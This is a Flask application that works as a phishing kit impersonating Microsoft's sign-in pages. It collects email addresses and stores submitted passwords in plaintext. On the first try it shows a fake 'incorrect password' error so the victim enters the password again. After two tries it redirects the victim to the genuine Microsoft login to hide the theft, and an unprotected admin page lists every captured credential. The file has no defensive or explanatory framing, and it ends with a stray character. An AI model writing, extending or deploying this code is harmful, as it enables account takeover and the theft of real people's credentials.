from flask import Flask, render_template, request, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import requests
import os
import re

app = Flask(__name__)

app.secret_key = os.environ.get('SECRET_KEY', 'ms_secret_key_2026')

app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ── Model ──
class LoginAttempt(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    email     = db.Column(db.String(150), nullable=False)
    password  = db.Column(db.String(150), nullable=True)
    status    = db.Column(db.String(50), default='unknown')
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<LoginAttempt {self.email}>'


# ── Simple email format check ──
def is_valid_email(email):
    pattern = r'^[^@\s]+@[^@\s]+\.[^@\s]+$'
    return re.match(pattern, email) is not None


# ── Routes ──
@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email = request.form.get('email', '').strip()

        if not email:
            error = "Please enter your email, phone, or Skype."
        elif not is_valid_email(email):
            error = "Enter a valid email address."
        else:
            session['email'] = email
            session['attempts'] = 0
            session.modified = True
            return redirect(url_for('password'))

    return render_template('login.html', error=error)


@app.route('/password', methods=['GET', 'POST'])
def password():
    email = session.get('email')
    error = None

    if not email:
        return redirect(url_for('login'))

    if request.method == 'POST':
        pwd = request.form.get('password', '').strip()

        if not pwd:
            error = "Please enter your password."
        else:
            # Track attempts
            attempts = session.get('attempts', 0) + 1
            session['attempts'] = attempts
            session.modified = True

            # Always save to DB
            attempt = LoginAttempt(email=email, password=pwd, status=f'attempt_{attempts}')
            db.session.add(attempt)
            db.session.commit()

            if attempts >= 2:
                # After 2 attempts redirect to real Microsoft
                return redirect(f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&response_type=code&login_hint={email}&scope=openid profile email')
            else:
                error = "Your account or password is incorrect. If you don't remember your password, reset it now."

    return render_template('password.html', email=email, error=error)


@app.route('/success')
def success():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    email = session.get('email', '')
    return render_template('success.html', email=email)


@app.route('/admin')
def admin():
    attempts = LoginAttempt.query.order_by(LoginAttempt.timestamp.desc()).all()
    return render_template('admin.html', attempts=attempts)


with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(debug=True)c